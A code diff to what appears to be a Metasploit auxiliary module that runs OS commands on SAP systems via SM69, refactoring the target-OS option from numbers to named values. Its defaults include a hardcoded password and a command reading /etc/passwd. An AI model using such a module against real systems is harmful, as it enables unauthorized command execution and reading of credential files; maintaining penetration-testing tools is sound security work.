@@ -36,7 +36,7 @@ class Metasploit4 < Msf::Auxiliary
                        OptString.new('PASS', [true, 'Password', '06071992']),
                        OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
                        OptString.new('PARAM', [true, 'Command Parameters', '/etc/passwd']),
-                       OptEnum.new('OS', [true, 'Operating System 1. ANYOS, 2. UNIX, 3. Windows NT, 4. AS/400, 5. OS/400', '2', [1,2,3,4,5]]),
+                       OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])
                      ], self.class)
   end
 
@@ -47,20 +47,7 @@ class Metasploit4 < Msf::Auxiliary
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    case(datastore['OS'])
-    when '1'
-      os = "ANYOS"
-    when '2'
-      os = "UNIX"
-    when '3'
-      os = 'Windows NT'
-    when '4'
-      os = 'AS/400'
-    when '5'
-      os = 'OS/400'
-    else
-      fail_with(Exploit::Failure::BadConfig, "Invalid OS")
-    end
+    os = datastore['OS']
 
     exec_CMD(user,client,pass,rhost,datastore['RPORT'], datastore['CMD'], datastore['PARAM'], os)
   end
